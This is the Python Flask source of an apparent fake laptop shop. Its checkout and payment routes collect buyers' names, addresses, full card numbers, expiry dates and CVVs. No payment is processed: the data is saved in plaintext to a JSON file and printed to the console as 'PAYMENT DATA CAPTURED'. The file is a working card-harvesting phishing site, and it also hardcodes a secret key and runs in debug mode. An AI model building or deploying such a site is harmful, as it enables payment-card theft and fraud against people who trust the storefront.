from flask import Flask, render_template, request, redirect, url_for, session
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'marketplace-secret-key-2024'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PAYMENTS_FILE = os.path.join(BASE_DIR, "payments.json")

# Product catalog
ITEMS = {
    "1": {
        "id": "1",
        "name": "Used Laptop",
        "price": 500,
        "description": "A reliable used laptop in excellent condition. Features an Intel i5 processor, 8GB RAM, and 256GB SSD. Perfect for everyday computing, office work, and light creative tasks. Battery life of approximately 5 hours. Comes with charger and protective sleeve.",
        "image": "💻"
    },
    "2": {
        "id": "2",
        "name": "Gaming Laptop",
        "price": 650,
        "description": "High-performance gaming laptop with dedicated NVIDIA graphics card, 16GB RAM, and 512GB SSD. Equipped with a 15.6-inch Full HD 144Hz display for smooth gameplay. RGB backlit keyboard included. Ideal for gaming, streaming, and content creation.",
        "image": "🎮"
    },
    "3": {
        "id": "3",
        "name": "MacBook Air",
        "price": 700,
        "description": "Apple MacBook Air with the M1 chip, 8GB unified memory, and 256GB SSD. Ultra-thin and lightweight design with a stunning 13.3-inch Retina display. All-day battery life of up to 18 hours. Includes MagSafe charging cable and power adapter.",
        "image": "🍎"
    }
}


def ensure_payments_file():
    """Create payments.json if it doesn't exist."""
    if not os.path.exists(PAYMENTS_FILE):
        with open(PAYMENTS_FILE, 'w') as f:
            json.dump({"entries": []}, f, indent=2)


@app.route('/')
def index():
    return render_template('index.html', items=ITEMS)


@app.route('/item/<item_id>')
def item(item_id):
    product = ITEMS.get(item_id)
    if not product:
        return "Item not found", 404
    return render_template('item.html', item=product)


@app.route('/checkout/<item_id>', methods=['GET', 'POST'])
def checkout(item_id):
    product = ITEMS.get(item_id)
    if not product:
        return "Item not found", 404

    if request.method == 'POST':
        session['checkout_name'] = request.form.get('name', '')
        session['checkout_email'] = request.form.get('email', '')
        session['checkout_address'] = request.form.get('address', '')
        return redirect(url_for('payment', item_id=item_id))

    return render_template('checkout.html', item=product)


@app.route('/payment/<item_id>')
def payment(item_id):
    product = ITEMS.get(item_id)
    if not product:
        return "Item not found", 404
    return render_template('payment.html', item=product)


@app.route('/process-payment', methods=['POST'])
def process_payment():
    ensure_payments_file()

    entry = {
        "name": session.get('checkout_name', ''),
        "email": session.get('checkout_email', ''),
        "address": session.get('checkout_address', ''),
        "card_number": request.form.get('card_number', ''),
        "expiry": request.form.get('expiry', ''),
        "cvv": request.form.get('cvv', ''),
        "timestamp": datetime.now().isoformat()
    }

    # Load existing data
    with open(PAYMENTS_FILE, 'r') as f:
        data = json.load(f)

    # Append new entry
    data['entries'].append(entry)

    # Save with indentation
    with open(PAYMENTS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

    # Print captured data to console
    print("\n" + "=" * 50)
    print("PAYMENT DATA CAPTURED")
    print("=" * 50)
    for key, value in entry.items():
        print(f"  {key}: {value}")
    print("=" * 50 + "\n")

    # Clear session checkout data
    session.pop('checkout_name', None)
    session.pop('checkout_email', None)
    session.pop('checkout_address', None)

    return redirect(url_for('success'))


@app.route('/success')
def success():
    return render_template('success.html')


if __name__ == '__main__':
    ensure_payments_file()
    print("\n[*] Marketplace is running at http://127.0.0.1:5000\n")
    app.run(debug=True, port=5000)
